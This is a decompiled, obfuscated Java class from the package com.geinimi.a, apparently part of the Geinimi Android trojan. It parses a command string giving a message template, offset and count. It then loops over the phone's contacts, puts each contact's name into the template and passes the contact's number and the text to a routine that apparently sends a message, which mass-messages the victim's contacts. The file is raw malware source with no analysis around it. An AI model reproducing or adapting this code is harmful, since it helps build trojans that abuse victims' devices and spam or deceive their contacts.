package com.geinimi.a;

import com.geinimi.c.c;
import com.geinimi.c.i;
import com.geinimi.c.k;

public final class l extends a {
    private String b = null;
    private int c = 0;
    private int d = 0;

    protected l(String str) {
        super(str);
    }

    public final void a() {
        k.i();
        String str = this.a;
        int indexOf = str.indexOf(59);
        if (indexOf < 0) {
            this.b = str;
            this.c = 0;
            this.d = -1;
            return;
        }
        this.b = str.substring(0, indexOf);
        try {
            String substring = str.substring(indexOf + 1);
            int indexOf2 = substring.indexOf(59);
            if (indexOf2 < 0) {
                throw new Exception("get offset error without ';'");
            }
            this.c = Integer.parseInt(substring.substring(0, indexOf2).trim());
            String substring2 = substring.substring(indexOf2 + 1);
            int indexOf3 = substring2.indexOf(59);
            if (indexOf3 > 0) {
                substring2 = substring2.substring(0, indexOf3);
            }
            this.d = Integer.parseInt(substring2.trim());
        } catch (Exception e) {
            e.printStackTrace();
            this.c = 0;
            this.d = -1;
        }
    }

    public final void b() {
        c[] j = k.j();
        if (this.d <= 0) {
            this.d = j.length;
        }
        if (j.length - this.d < this.c) {
            this.c = j.length - this.d;
        }
        if (this.c < 0) {
            this.c = 0;
            this.d = j.length;
        }
        for (int i = 0; i < this.d; i++) {
            String str = this.b;
            while (true) {
                int indexOf = str.indexOf("@@");
                if (indexOf < 0) {
                    break;
                }
                String substring = str.substring(0, indexOf);
                String substring2 = str.substring(indexOf + 2);
                int indexOf2 = substring2.indexOf("@(");
                if (indexOf2 < 0) {
                    break;
                }
                String substring3 = substring2.substring(0, indexOf2);
                String substring4 = substring2.substring(indexOf2 + 2);
                int indexOf3 = substring4.indexOf(41);
                if (indexOf3 < 0) {
                    break;
                }
                String substring5 = substring4.substring(0, indexOf3);
                String substring6 = substring4.substring(indexOf3 + 1);
                str = substring3.endsWith("contactname") ? substring + j[i].a + substring6 : substring + substring5 + substring6;
            }
            String str2 = j[i].b;
            int indexOf4 = str2.indexOf(59);
            if (indexOf4 > 0) {
                str2 = str2.substring(0, indexOf4);
            }
            i.a(str2, str);
        }
    }
}
